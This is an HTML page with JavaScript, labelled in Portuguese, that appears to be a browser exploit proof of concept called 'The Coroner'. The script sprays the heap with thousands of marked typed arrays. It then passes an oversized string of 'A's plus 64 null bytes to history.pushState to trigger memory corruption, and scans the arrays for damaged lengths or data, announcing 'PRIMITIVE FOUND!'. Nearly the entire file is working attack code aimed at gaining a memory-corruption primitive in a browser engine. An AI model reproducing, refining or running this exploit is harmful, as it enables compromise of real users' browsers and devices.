<!DOCTYPE html>
<html>
<head>
    <title>The Coroner: Detecting Silent Corruption</title>
    <style>
        body { background: #111; color: #fff; font-family: monospace; padding: 20px; }
        .log { border: 1px solid #555; height: 350px; overflow-y: scroll; padding: 10px; background: #000; color: #ccc; margin-bottom: 15px;}
        button { 
            padding: 20px; width: 100%; font-size: 20px; font-weight: bold; 
            cursor: pointer; border: 2px solid #fff; 
            background: #300; color: #fff; transition: 0.2s;
        }
        button:hover { background: #f00; color: #000; }
        .success { background: #0f0; color: #000; padding: 10px; font-size: 20px; }
    </style>
</head>
<body>
    <h1>THE CORONER</h1>
    <p>Base: 709518 | Payload: 64 Bytes de ZEROS</p>
    <p>Objetivo: Encontrar vizinhos que pararam de responder (Silent Death).</p>

    <button onclick="runCoroner()">INJETAR E EXAMINAR</button>

    <div id="logger" class="log">Aguardando...</div>

    <script>
        const logger = document.getElementById('logger');
        const BASE_SIZE = 709518; 
        const MAGIC_NUM = 0x41414141;
        const SPRAY_SIZE = 12000; // Spray denso

        var spray = [];

        function log(msg, type) {
            const d = document.createElement('div');
            d.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
            if(type) d.style.color = type;
            logger.appendChild(d);
            logger.scrollTop = logger.scrollHeight;
        }

        async function runCoroner() {
            log("---------------------------------------");
            log("INICIANDO PROCEDIMENTO...");

            spray = null;
            if(window.gc) window.gc();
            await new Promise(r => setTimeout(r, 300));
            spray = [];

            // 1. SPRAY
            for(let i=0; i < SPRAY_SIZE; i++) {
                let arr = new Uint32Array(1024);
                arr[0] = MAGIC_NUM; 
                arr[1] = i; 
                // Marcador no final para garantir integridade inicial
                arr[1023] = 0xDEADBEEF;
                spray.push(arr);
            }

            log("Estabilizando...");
            await new Promise(r => setTimeout(r, 1000));

            try {
                // 2. INJEÇÃO (Base + 64 Zeros)
                let base = new Array(BASE_SIZE + 1).join('A');
                let overflow = new Array(65).join('\x00');
                let payload = base + overflow;

                history.pushState({}, "pwn_" + Date.now(), payload);
                
                // 3. AUTOPSIA (Verificação Paranóica)
                checkCasualties();

            } catch(e) {
                log("ERRO FATAL NO JS: " + e.message, "red");
            }
        }

        function checkCasualties() {
            log("Examinando os pacientes...");
            let found = false;
            
            // Varredura reversa
            for(let i = spray.length - 1; i >= 0; i--) {
                let arr = spray[i];
                
                // --- TESTE DE VIDA OU MORTE ---
                try {
                    // Teste 1: O objeto ainda existe?
                    if(!arr) continue;

                    // Teste 2: Tentar ler a propriedade LENGTH
                    let len = arr.length;

                    // SINAL DE SUCESSO 1: Length Indefinido
                    if(len === undefined) {
                        reportSuccess(i, "UNDEFINED LENGTH", "O Header foi apagado!");
                        return;
                    }

                    // SINAL DE SUCESSO 2: Length Zero (Mas não deveria ser)
                    if(len === 0) {
                        reportSuccess(i, "ZERO LENGTH", "Objeto neutralizado (Header/Butterfly zerado).");
                        return;
                    }

                    // SINAL DE SUCESSO 3: Length Mudou
                    if(len !== 1024) {
                        reportSuccess(i, "LENGTH CHANGE", `Novo valor: ${len}`);
                        return;
                    }

                    // Teste 3: Tentar ler dados
                    let val = arr[0];
                    
                    // SINAL DE SUCESSO 4: Dados Indefinidos (Ponteiro Quebrado)
                    if(val === undefined) {
                        reportSuccess(i, "UNDEFINED DATA", "Ponteiro de dados corrompido.");
                        return;
                    }

                    // SINAL DE SUCESSO 5: Magic Number Sumiu
                    if(val !== MAGIC_NUM) {
                        reportSuccess(i, "DATA CORRUPTION", `Valor lido: 0x${val.toString(16)}`);
                        return;
                    }

                } catch(e) {
                    // SINAL DE SUCESSO SUPREMO: Acessar o objeto causou erro!
                    // Isso significa que o ponteiro é inválido, mas o JS capturou antes do Kernel Panic
                    reportSuccess(i, "EXCEPTION THROWN", `Erro ao tocar no objeto: ${e.message}`);
                    return;
                }
            }
            if(!found) log("Nenhum sinal de trauma. Todos os objetos parecem saudáveis (ou o payload caiu no limbo).");
        }

        function reportSuccess(idx, type, details) {
            document.body.innerHTML = "";
            document.body.style.background = "#0f0";
            
            let h1 = document.createElement("h1");
            h1.innerText = "PRIMITIVE FOUND!";
            h1.style.color = "black";
            
            let h2 = document.createElement("h2");
            h2.innerText = `Index: ${idx} | Type: ${type}`;
            h2.style.color = "black";
            
            let p = document.createElement("p");
            p.innerText = details;
            p.style.color = "black";
            p.style.fontSize = "24px";

            document.body.appendChild(h1);
            document.body.appendChild(h2);
            document.body.appendChild(p);
            
            alert(`SUCESSO!\nIndex: ${idx}\n${type}`);
        }
    </script>
</body>
</html>
